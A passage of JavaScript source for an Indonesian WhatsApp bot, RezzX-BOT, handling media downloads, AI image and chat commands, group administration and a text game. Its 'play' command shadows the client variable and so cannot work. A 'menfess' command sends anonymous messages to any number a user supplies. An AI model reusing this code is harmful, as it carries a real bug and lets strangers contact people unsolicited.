    let uurl = 'https://telegra.ph/file/551938ae58e133faa78b9.png'
    replyai(sim.result, hss, shh, uurl)
    rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
  } catch (err) {
      m.reply(mess.error)
    }
}
break

case 'play': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.play not you*`)
  
  try {
    let res = await yts(text)
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)]
    let teks = `⏩ *PLAYING AUDIO*\n\n*Judul :* ${result.title}\n*Upload At :* ${result.ago}\n*Url :* ${result.url}\n\n📦 *AUDIO SEDANG DIPROSES....*`
    
    await rezzx.sendMessage(m.chat, { image: { url: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ62gQAqPH1uLzvMiofd10uGGkCdLoup06xXM-OTVDDlg&s' },  caption: teks }, { quoted: m })
    
  let load = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${result.url}`)).json();
  let rezzx = load.result
  
    await rezzx.sendMessage(m.chat, { 
      audio: { 
        url: rezzx.download_url 
      }, 
      mimetype: 'audio/mp4', contextInfo: {
        externalAdReply: {
          title: rezzx.title,
          body: `Type : ${rezzx.type}`,
          thumbnailUrl: rezzx.image,
          mediaType: 1,
          showAdAttribution: false,
          renderLargerThumbnail: true,
        },
      }, 
    }, { quoted: m });
  } catch (error) {
    m.reply(`rezzx api sedang error, segera repot ke owner!`);
  }
}
break

case 'ytmp3': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ytmp3 <link youtube>*')
try {
  m.reply('*Process sending audio, mungkin ini membutuhkan 1-3 menit jika durasi terlalu panjang*')
  let procees = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${text}`)).json()
  let audio = procees.result; 
  rezzx.sendMessage(m.chat, { 
      audio: { 
        url: audio.download_url 
      }, 
      mimetype: 'audio/mp4', contextInfo: {
        externalAdReply: {
          title: audio.title,
          body: `Type : ${audio.type}`,
          thumbnailUrl: audio.image,
          mediaType: 1,
          showAdAttribution: false,
          renderLargerThumbnail: true,
        },
      }, 
    }, { quoted: m });
} catch (e) {
    m.reply('*terjadi error :*' + e)
}
}
break

case 'ytmp4': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ytmp4 <link youtube>*')
try {
  m.reply('*Process sending video, mungkin membutuhkan 1-3 menit jika durasi video panjang!*')
  let proces = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-video?url=${text}`)).json()
  let video4 = proces.result; 
  rezzx.sendMessage(m.chat,{video:{url: video4.download_url }, caption: video4.title},{quoted: m})
} catch (e) {
    m.reply('*terjadi error :*' + e);
}
}
break

case 'playvid': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.playvid lamunan*')
  let playytvid = await (await fetch(`https://itzpire.com/download/play-youtube?title=${text}`)).json()
  let video = playytvid.data.video
  let ytcap = `Title : ${video.title}\nChanel : ${video.channel}\nPublished : ${video.published}\nViews : ${video.views}`
  m.reply(mess.wait)
  rezzx.sendMessage(m.chat,{video:{url: video.url}, caption: ytcap},{quoted: m})
  okk()
}
break

case 'randomdouyin': {
  if (isBan) return m.reply(mess.ban)
  let pro = await (await fetch('https://widipe.com/asupandouyin')).json()
  let slu = pro.url
  rezzx.sendMessage(m.chat,{video:{url: slu}, caption: '*SUCCESS* ✅'},{quoted: m})
}
break

case 'ping': {
  if (isBan) return m.reply(mess.ban)
  const used = process.memoryUsage()
  const cpus = os.cpus().map(cpu => {
    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
    return cpu
  })
  const cpu = cpus.reduce((last, cpu, _, {
    length
  }) => {
    last.total += cpu.total
    last.speed += cpu.speed / length
    last.times.user += cpu.times.user
    last.times.nice += cpu.times.nice
    last.times.sys += cpu.times.sys
    last.times.idle += cpu.times.idle
    last.times.irq += cpu.times.irq
    return last
  }, {
    speed: 0,
    total: 0,
    times: {
      user: 0,
      nice: 0,
      sys: 0,
      idle: 0,
      irq: 0
    }
  })
  let timestamp = speed()
  let latensi = speed() - timestamp
  neww = performance.now()
  oldd = performance.now()
  pur = 'https://telegra.ph/file/1db0e0a590c7949488022.png'
  respon = `💻 *Kecepatan Respon : ${latensi.toFixed(4)} Detik* \n🕒 *${oldd - neww} Milidetik*\n📦 *Runtime : ${runtime(process.uptime())}*

📂 *Info Server*
 *• RAM : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*

${cpus[0] ? `📌 *Total Cpu Usage*\n *• ${cpus[0].model.trim()} (${cpu.speed} MHZ)*\n${Object.keys(cpu.times).map(type => ` *• ${(type + '*').padEnd(6)}: *${(100 * cpu.times[type] / cpu.total).toFixed(2)}%*`).join('\n')}
 *• CPU Core(s) Usage (${cpus.length} Core CPU)*` : ''}
`.trim()
xreply(respon, pur)
}
break

case 'hd': case 'hdr': case 'remini': {
  if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .hd*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .hd*`)
  wett();
  let media = await quoted.download() 
  let proses = await remini(media, "enhance");
  rezzx.sendMessage(m.chat, { image: proses, caption: '*SUCCESS ✅*'}, { quoted: m})
  okk();
}
break

case 'stickeranime': case 'stickanime':
  rezzx.sendFile(m.chat, `https://pic.re/image`, '', `Random Image picre\n\n*Powered by pic.re`, m)
break

case 'menfess':
    if (isBan) return m.reply(mess.ban)
    if (m.isGroup) return m.reply(mess.priv)
    if (!text) return m.reply(`️*PERMINTAAN ERROR!! CONTOH :*\n> *.menfess 62xxxx|nama|pesan*`);
    let nomor = q.split('|')[0] ? q.split('|')[0] : q;
    let names = q.split('|')[1] ? q.split('|')[1] : q;
    let chat = q.split('|')[2] ? q.split('|')[2] : '';
    if (chat.length < 1) return m.reply(`*Error!! Tolong Isi Semua Data Dengan Baik*`);
    
    let txt = `*Halo ${pushname} Ada Kiriman Menfess Nih*\n👤 *Dari : ${names}* \n📝 *Pesan :*\n${chat}\n\n🔒 *Anda juga bisa membalas menfess ini dengan mengetik* _.menfess_`;
    rezzx.sendMessage(`${nomor}@s.whatsapp.net`, { caption: txt, image: {url: `https://telegra.ph/file/af2fdde83902148b23b86.jpg`}});
    m.reply(`*Sukses Mengirim Menfess*`);
break

case 'storyanime': {
  if (isBan) return m.reply(mess.ban)
  let sni = await (await fetch('https://widipe.com/download/storyanime')).json()
  let sni2 = sni.result
  rezzx.sendMessage(m.chat,{video:{url: sni2.url}, caption: '*SUCCESS* ✅'},{quoted:m})
}
break

case 'txt2img': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.txt2img house*')
  try {
    let tim = await getBuffer(`https://widipe.com/ai/text2img?text=${text}`)
    rezzx.sendMessage(m.chat,{image: tim,caption: '*SUCCESS ✅*'},{quoted:shan})
  } catch (err) {
      m.reply('*FITUR ERROR!!, REPORT KE OWNER BROO*')
    }
}
break

case 'dalle3': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.dalle3 cute girl*')
  try {
    let dl3 = await getBuffer(`https://widipe.com/dalle?text=${text}`)
    rezzx.sendMessage(m.chat,{image: dl3,caption: '*SUCCESS ✅*'},{quoted:shan})
  } catch (err) {
      m.reply('*FITUR ERROR!!, REPORT KE OWNER BROO*')
    }
}
break

case 'gpt4': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.gpt4 apa itu waifu?*')
  try {
    rezzx.sendMessage(m.chat, {react: { text: '🕒', key: m.key,}})
    let gp4 = await (await fetch(`https://widipe.com/gpt4?text=${text}`)).json()
    let wmgt = 'GPT-4 AI'
    let supt = 'session: false'
    let urel = 'https://telegra.ph/file/c1a23b03eb59e3dc08cfd.png'
    replyai(gp4.result, wmgt, supt, urel)
    rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
  } catch (err) {
      m.reply(mess.error)
    }
}
break

case 'ttsearch': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ttsearch kayes hot*')
  let mann = require('d-scrape')
  let mannr = await mann.search.tiktoks(text)
  rezzx.sendMessage(m.chat,{video:{url: mannr.no_watermark},caption: mannr.title},{})
}
break

case 'cerpen': {
  if (isBan) return m.reply(mess.ban)
  const mann = require('d-scrape')
  const mannr = await mann.random.randomCerpen()
  var yaya = `*[ RANDOM CERPEN ]*\n\n*Judul:* ${mannr.judul}\n*Penulis:* ${mannr.penulis}\n\n${mannr.cerita}\n\n_${mannr.sumber}_`
  m.reply(yaya)
}
break

case 'report':{
  if (isBan) return m.reply(mess.ban)
  let text = args[0]
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.report halo bang rezzx yg ganteng, fitur menfess erorr 🗿*`)
  if (text.length > 25) return m.reply(`*PERMINTAAN EROR!! :*\n> *Gunakan Maksimal 25 Huruf*`)    
  m.reply(`✅ *Report Berhasil Terkirim!n*\n\n_terimakasih sudah membantu mengembangkan RezzX-BOT_`)
  rezzx.sendMessage(`${owner}@s.whatsapp.net`, { text: `*NewReport*\n🎁 *Dari :* @${sender.split('@')[0]}\n📝 *Pesan :* ${text}`, mentions: [sender]}, { quoted: m })
}
break

case 'editdesk':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins) return m.reply(mess.admin)
  if (!text) m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.editdesk <text desk nya>*')
  await rezzx.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'tagall': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPremium) return m.reply(mess.prem)
  if (!text) return m.reply ('*PERMINTAAN ERROR!! CONTOH :*\n> *.tagall <pesan text>*')
  let teks = `Tagall From : *${pushname}*\nPesan : *${q ? q : 'kosong'}*\n\n`
  for (let mem of participants) {
  teks += `• @${mem.id.split('@')[0]}\n`
  }
  rezzx.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break

case 'totalfitur':
  if (isBan) return m.reply(mess.ban)
  m.reply(`*🎁 Total:* ${totalFitur()}`)
break

case 'menu': {
  if (isBan) return m.reply(mess.ban)
  rezzx.sendMessage(m.chat, {react: { text: '🕒', key: m.key,}})
  if (cekUser("id", sender) == null) return m.reply(mess.reg)
  let totalStorage = Math.floor(os.totalmem() / 1024 / 1024) + 'MB'
  let freeStorage = Math.floor(os.freemem() / 1024 / 1024) + 'MB'
  let cpuCount = os.cpus().length
  let tekss = `_Halo kak ${tag}, ${waktu}, Nama Saya RezzX-BOT, Saya Adalah Bot Yang Multifungsi, Jika Ada Beberapa Bug Atau Fitur Yang Tidak Work Mohon Segera Lapor Ke Owner_\n\n*[ I N F O B O T ]*

> *NameBot : ${namabot}*
> *Version : ${versisc}*
> *Runtime : ${runtime(process.uptime())}*
> *BotMode : ${rezzx.public ? `Public` : `Self`}*
> *Database : JSON*
> *Author : ${namaCreator}*
> *Total Storage : ${totalStorage}*
> *Free Storage : ${freeStorage}*
> *CPU Model : Intel Core i5*
> *CPU Speed : 2.20 GHz*
> *CPU Cores : 4 Core*
> *CPU Thread : 6 Thread*

*Note:* _Script Ini Masih Tahap Pengembangan Jadi Kalo Error Harap dimaklumi_`


  let sections = [{
        title: 'RezzX-V12',
        highlight_label: 'Only Owner RezzX',
        rows: [{
        header: 'Menunjukkan Menu Owner',
        title: 'Owner Menu 👤',
        description: `Daftar Command Menu Owner 📃`,
        id: `${prefix}menuowner`
        }]
        },
        {
        title: 'List Menu RezzX-BOT',
        highlight_label: 'Can be Access',
        rows: [{
        header: 'Menunjukkan Menu Store',
        title: 'Store Menu 💱',
        description: "Daftar Command Menu Store 📃",
        id: `${prefix}menustore`
        },
        {
        header: 'Menunjukkan Menu Group',
        title: 'Group Menu 👥',
        description: "Daftar Command Menu Group 📃",
        id: `${prefix}menugroup`
        },
        {
        header: 'Menunjukkan Menu Search',
        title: 'Search Menu 🔍',
        description: "Daftar Command Menu Search 📃",
        id: `${prefix}menusearch`
        },
        {
        header: 'Menunjukkan Menu Sticker',
        title: 'Sticker Menu 📜',
        description: "Daftar Command Menu Sticker 📃",
        id: `${prefix}menusticker`
        },
        {
        header: 'Menunjukkan Menu Fun',
        title: 'Fun Menu 🎲',
        description: "Daftar Command Menu Fun 📃",
        id: `${prefix}menufun`
        },
        {
        header: 'Menunjukkan Menu Islam',
        title: 'Islam Menu ☪️',
        description: "Daftar Command Menu Islam 📃",
        id: `${prefix}menuislam`
        },
        {
        header: 'Menunjukkan Menu Ai',
        title: 'Ai Menu 🎐',
        description: "Daftar Command Menu Ai 📃",
        id: `${prefix}menuai`
        },
        {
        header: 'Menunjukkan Menu Anime',
        title: 'Anime Menu 🇯🇵',
        description: "Daftar Command Menu Anime 📃",
        id: `${prefix}menuanime`
        },
        {
        header: 'Menunjukkan Menu Ephoto',
        title: 'Ephoto Menu 📹',
        description: "Daftar Command Menu Ephoto 📃",
        id: `${prefix}menuephoto`
        },
        {
        header: 'Menunjukkan Menu Textpro',
        title: 'Textpro Menu 🔮',
        description: "Daftar Command Menu Textpro 📃",
        id: `${prefix}menutextpro`
        },
        {
        header: 'Menunjukkan Menu Rpg',
        title: 'Rpg Menu 🎮',
        description: "Daftar Command Menu Rpg 📃",
        id: `${prefix}menurpg`
        },
        {
        header: 'Menunjukkan Menu Download',
        title: 'Download Menu 📎',
        description: "Daftar Command Menu Download 📃",
        id: `${prefix}menudownload`
        },
        {
        header: 'Menunjukkan Menu Maker',
        title: 'Maker Menu 📦',
        description: "Daftar Command Menu Maker 📃",
        id: `${prefix}menumaker`
        },
        {
        header: 'Menunjukkan Menu Hacking',
        title: 'Hacking Menu 🔐',
        description: "Daftar Command Menu Hacking 📃",
        id: `${prefix}menuhacking`
        },
        {
        header: 'Menunjukkan Menu Random',
        title: 'Random Menu 💎',
        description: "Daftar Command Menu Random 📃",
        id: `${prefix}menurandom`
        },
        {
        header: 'Menunjukkan Menu Tools',
        title: 'Tools Menu 🔧',
        description: "Daftar Command Menu Tools 📃",
        id: `${prefix}menutools`
	    }]
   }]
  let listMessage = {
    title: '🍀 MENU LIST 🍀', 
    sections
};
  let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
         contextInfo: {
        	mentionedJid: [m.sender], 
        	isForwarded: true, 
	        forwardedNewsletterMessageInfo: {
			newsletterJid: '120363303294206875@newsletter',
			newsletterName: waktu, 
			serverMessageId: -1
			},
			externalAdReply: {
            title: 'RezzX-V12 Multifungsi', 
            body: 'Versi 12',
            thumbnailUrl: 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg',
            sourceUrl: 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg',
            mediaType: 1,
            fromMe: true,
            renderLargerThumbnail: true
            },
		},
          body: proto.Message.InteractiveMessage.Body.create({
            text: tekss
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '_*© RezzX-V12*_'
          }), 
          header: proto.Message.InteractiveMessage.Header.create({
            title: `*🍀 REZZX V12🍀*`,
            subtitle: "RezzX-V12",
            fromMe: true,
            hasMediaAttachment: true,...(await prepareWAMessageMedia({ document: { url: 'https://wa.me/' }, mimetype: 'image/png', fileName: `Hallo ${pushname}`, jpegThumbnail: fkethmb, fileLength: 0 }, { upload: rezzx.waUploadToServer }))
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [              
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              },
              {
              "name": "quick_reply",
              "buttonParamsJson": "{\"display_text\":\"🍀OWNER REZZX 🍀\",\"id\":\".owner\"}"
              },
              {
              "name": "quick_reply",
              "buttonParamsJson": "{\"display_text\":\"🍀CREDITS 👥\",\"id\":\".credit\"}"
              },
              /*{
                "name": "cta_call",
                 "buttonParamsJson": "{\"display_text\":\"Hubungi Nomor Owner\",\"id\":\"085717062467\"}"
              },*/
              {
              "name": "cta_url",
              "buttonParamsJson": "{\"display_text\":\"Website 💻\",\"url\":\"${global.rezzurl2}\",\"merchant_url\":\"${global.rezzurl2}\"}"
              }
           ],
          })
        })
    }
  }
}, { quoted: shan })

  rezzx.sendMessage(m.chat, {react: { text: '✅', key: m.key,}})
  rezzx.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: m.key.id
})
}
break

case 'cekkhodam': {
if (!text) return m.reply("ketik nama lu anjg")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	m.reply(response)
  }
break

case 'cekkhodamv2':
  if (!text) return m.reply(`PERMINTAAN ERROR!! CONTOH :\n> .${command} namalo`)
  const khodamList = ["Jin Ifrit","Ratu Pantai Selatan","Nyi Roro Kidul","Singa Rajawali","Harimau Putih","Mbah Jugo","Kyai Ageng","Putri Cemara","Ratu Gung Binatara","Kyai Kanjeng","Dewi Sri","Prabu Siliwangi","Sunan Kalijaga","Eyang Semar","Hanoman","Dewi Durga","Kyai Petruk","Kanjeng Ratu Kidul","Sunan Gunung Jati","Ki Juru Mertani","Eyang Merapi","Ki Ageng Gribig","Nyai Blorong","Eyang Suro","Raden Wijaya","Kyai Keramat","Nyai Selasih","Ki Juru Kunci","Roro Mendut","Ki Joko Bodo","Eyang Panembahan Senopati","Nyai Rantamsari","Kyai Tumenggung","Roro Jonggrang","Nyai Loro Kidul","Kyai Panembahan","Nyai Gandasari","Eyang Tambakbaya","Nyai Kuning","Kyai Sekarjagat","Nyai Melati","Kyai Tunggulwulung","Nyai Wulan","Ki Juru Taman","Eyang Sabdo Palon","Nyai Srengenge","Kyai Jagad","Nyai Kadipaten"];

function getKhodam(name) {
   const randomIndex = Math.floor(Math.random() * khodamList.length);
   return khodamList[randomIndex];
}
  
  let rawr = await getKhodam(text)
  let aww = `
  ╭━━━━°「 *Cekkodam-v2* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${rawr}
╰═┅═━––––––๑
	  `
  m.reply(aww)
break

//Paket Game
case 'lshelp': {
  if (isBan) return m.reply(mess.ban) 
  let umr = 'https://telegra.ph/file/5b7bd8651119eb890827a.jpg'
  let { lshelp } = require('./lib/listmenu.js')
  let hlp = lshelp() 
  xreply(hlp, umr)
}
break

case 'listcraft': {
  if (isBan) return m.reply(mess.ban)
  let crl = 'https://telegra.ph/file/9bb40ba162d0d334fd467.jpg'
  let { listcraft } = require('./lib/listmenu.js')
  let crt = listcraft()
  xreply(crt, crl)
}
break

case 'listtempat': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru atau load sesi dengan memasukkan* _.lsstart_")
  let urx = 'https://telegra.ph/file/dfa312100f0134956936f.jpg'
  let { listtempat } = require('./lib/listmenu.js')
  let tmt = listtempat()
  xreply(tmt, urx)
}
break

case 'last-survive': {
  if (isBan) return m.reply(mess.ban)
  let umi = 'https://telegra.ph/file/a8be25f3d40986e6cd67e.jpg'
  let { lasts } = require('./lib/listmenu.js')
  let las = lasts()
  xreply(las, umi)
}
break

case 'lssave': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru atau load sesi dengan memasukkan* _.lsstart_")
  m.reply('*Game berhasil disave anda bisa keluar dari game sekarang!!*')
}
break

case 'lsstart': {
  if (isBan) return m.reply(mess.ban)
  const startMessage = startGame();
  m.reply(startMessage);
}
break

case 'lsexit': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru dengan memasukkan* _.lsstart_");
  const exitMessage = exitGame();
  m.reply(exitMessage);
}
break

case 'cari': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru dengan memasukkan* _.lsstart_");
  const searchMessage = searchPlace();
  m.reply(searchMessage);
}
break
    
case 'ambil': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru dengan memasukkan* _.lsstart_");
  if (!q) return m.reply('*Harap masukkan item yang ingin diambil. Contoh:* _.ambil batu_');
  const item = q.trim().toLowerCase();
  const takeMessage = takeItem(item);
  m.reply(takeMessage);
}
break
    case 'backpack': {
    if (isBan) return m.reply(mess.ban)
    if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru dengan memasukkan* _.lsstart_");
    const inventoryMessage = getPlayerInventory();
    m.reply(inventoryMessage);
}
break

case 'pergi': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru dengan memasukkan* _.lsstart_");
  if (!q) return m.reply('*Harap masukkan tempat yang ingin dituju. Contoh:* _.pergi bengkel_');
  const place = q.trim().toLowerCase();
  const moveMessage = movePlayer(place);
  m.reply(moveMessage);
}
break
        
case 'lawan': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru dengan memasukkan* _.lsstart_");
  const fightMessage = fightZombie();
  m.reply(fightMessage);
}
break

case 'craft': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru atau load sesi dengan memasukkan* _.lsstart_")
  if (args.length === 0) {
    m.reply('*Silakan sebutkan item yang ingin dibuat. Contoh:* _.craft perban_');
  } else {
      const item = args[0].toLowerCase();
      const craftMessage = craftItem(item);
      m.reply(craftMessage);
    }
}
break

case 'gunakan': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru atau load sesi dengan memasukkan* _.lsstart_");
  if (args.length === 0) {
    m.reply('*Silakan sebutkan item yang ingin digunakan. Contoh:* _.gunakan perban_');
  } else {
      const item = args[0].toLowerCase();
      const useMessage = useItem(item);
      m.reply(useMessage);
    }
}
break

case 'lepas': {
  if (isBan) return m.reply(mess.ban)
  if (!player.started) return m.reply("*Tidak ada sesi game saat ini, Buat sesi baru atau load sesi dengan memasukkan* _.lsstart_")
  if (args.length === 0) {
    m.reply('*Silakan sebutkan senjata yang ingin dilepas. Contoh:* _.lepas pisau_');
  } else {
      const item = args[0].toLowerCase();
      const releaseMessage = releaseWeapon(item);
      m.reply(releaseMessage);
    }
}
break
//End Paket

case 'uptime': case 'runtime': {
  if (isBan) return m.reply(mess.ban)
  m.reply(`Runtime : ${runtime(process.uptime())}`)
}
break

case 'git': case 'gitclone': {
  if (isBan) return m.reply(mess.ban)
  if (!args[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.git <link github>*`)
  if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
  let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
  let [, user, repo] = args[0].match(regex1) || []
  repo = repo.replace(/.git$/, '')
  let url = `https://api.github.com/repos/${user}/${repo}/zipball`
  let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
  rezzx.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(`Eror :/`))
}
break

case 'group': {   
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isAdmins) return m.reply(mess.botAdmin)
  if (!args[0]) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.group <open/close>*')
  if (args[0] === 'close'){
    await rezzx.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`📣 *GROUP CLOSE MODE*`)).catch((err) => m.reply(jsonformat(err)))
  } else if (args[0] === 'open'){
      await rezzx.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`📣 *GROUP OPEN MODE*`)).catch((err) => m.reply(jsonformat(err)))
    } else {
      m.reply('COMMAND NOT RESPONDED')
      }
}
break

case 'linkgroup': case 'linkgc': {
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  let response = await rezzx.groupInviteCode(from)
  rezzx.sendText(from, `Link Group : https://chat.whatsapp.com/${response}\n\nName Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  rezzx.groupRevokeInvite(from)
break

case 'sendlinkgc': {
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!args[0]) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.sendlinkgc 62xxxx*`)
  bnnd = text.split("|")[0]+'@s.whatsapp.net'
  let response = await rezzx.groupInviteCode(from)
  rezzx.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'hidetag': case 'h': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.h <pesan text>*')
  if (!isAdmins) return m.reply(mess.admin)
  if (!m.isGroup) return m.reply(mess.group)
  rezzx.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

case 'tiktokmp3': case 'ttmp3':{
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply( `*PERMINTAAN ERROR!! CONTOH :*\n> *.ttmp3 <link tiktok>*`)
  if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
  require('./lib/tiktok').Tiktok(q).then( data => {
  rezzx.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
  })
}
break

case 'pixelart': case 'pa':  {
 if (isBan) return m.reply(mess.ban)
  if (!text) m.reply ( `*PERMINTAAN ERROR!! CONTOH :*\n> *.pa cat girl*`)
    try {
      let pa = await (await fetch(`https://itzpire.com/ai/pixelart?prompt=${text}`)).json()
      let cap = '*PROCESS SUCESS* ✅'
      rezzx.sendMessage(m.chat, { image: { url: pa.result }, caption: cap }, { quoted: m })
    } catch(e) {
        m.reply ( "*TIDAK ADA RESPONS*")
      }
}
break

case 'photoleap': case 'pl':  {
  if (isBan) return m.reply(mess.ban)
  if (!text) m.reply ( `*PERMINTAAN ERROR!! CONTOH :*\n> *.pl anime girl*`)
  try {
    let pl = await (await fetch(`https://itzpire.com/ai/photoleap?prompt=${text}`)).json()
    let cap = '*PROCESS SUCESS* ✅'
    rezzx.sendMessage(m.chat, { image: { url: pl.result }, caption: cap }, { quoted: m })
  } catch(e) {
      m.reply ( "`*Command Not Responded*`")
    }
}
break

case 'add': {
